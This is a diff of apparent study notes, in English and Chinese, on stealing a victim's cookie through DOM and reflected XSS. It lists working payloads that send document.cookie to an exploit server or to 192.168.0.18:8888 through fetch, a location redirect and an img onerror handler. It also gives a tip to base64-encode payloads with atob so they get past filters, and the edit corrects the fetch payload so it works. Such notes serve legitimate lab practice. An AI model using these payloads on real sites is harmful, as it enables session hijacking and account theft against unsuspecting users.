@@ -59,7 +59,7 @@ https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
 
 How to get victim's cookie?
 对于DOM和Reflected来说，因为payload是放在url中的，所以通常使用下面这些方法来传递cookie.
-1. fetch('exploit_server/?document.cookie()')
+1. fetch('exploit_server/?'+document.cookie)
 2. location='https://lab/?query=(document.location="https://exploitserver/?document.cookie")
 3. <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
 4. <!-- ALL TOGETHER BELOW-->
@@ -93,7 +93,7 @@ body:document.cookie
 });
 </script>
 
-If it is blocked, you may need to encode with base64. You can first base64 with btoa(payload) in your browser's console. Then you can use atob(payload) as your final payload.
+If it is blocked, you may need to encode with base64. you can use atob(payload) as your final payload.
 
 
 
